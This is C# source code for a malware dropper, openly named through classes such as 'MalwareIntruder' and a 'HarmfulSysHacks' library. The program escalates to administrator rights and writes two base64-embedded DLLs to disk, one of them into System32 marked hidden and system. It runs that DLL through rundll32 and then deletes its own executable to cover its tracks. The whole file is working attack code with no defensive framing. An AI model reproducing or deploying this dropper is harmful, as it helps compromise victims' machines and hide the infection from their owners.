using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using VortexSecOps.HarmfulSysHacks;

namespace vcryx
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (!MalwareIntruder.IsRunningAsAdministrator())
            {
                MalwareIntruder.RestartCurrentAppAsAdmin();
            }
            byte[] vcryBuffer = Convert.FromBase64String(Dll.Vcry);
            byte[] vncyBuffer = Convert.FromBase64String(Dll.Vncy);
            string vcryPath = @"C:\vcry.dll";
            string vncyPath = @"C:\Windows\System32\vncy.dll";
            if (File.Exists(vcryPath))
            {
                File.Delete(vcryPath);
            }
            if (File.Exists(vncyPath))
            {
                File.Delete(vncyPath);
            }
            File.WriteAllBytes(vcryPath, vcryBuffer);
            File.WriteAllBytes(vncyPath, vncyBuffer);
            FileInfo fileInfo = new FileInfo(vncyPath);
            if (fileInfo.Exists)
            {
                fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
            }
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "Rundll32.exe",
                Arguments = $"\"{vncyPath}\",run",
                Verb = "runas",
                UseShellExecute = false,
            };
            using(Process process = Process.Start(startInfo))
            {
                if (process != null)
                {
                    process.Dispose();
                }
            }
            ProcessStartInfo startInfo2 = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = $"/C timeout/T 1 /NOBREAK&&del /F \"{Process.GetCurrentProcess().MainModule.FileName}\"",
                Verb = "runas",
                CreateNoWindow = true,
                UseShellExecute = false,
            };
            using(Process process = Process.Start(startInfo2))
            {
                if (process != null)
                {
                    process.Dispose();
                }
            }
        }
    }
}
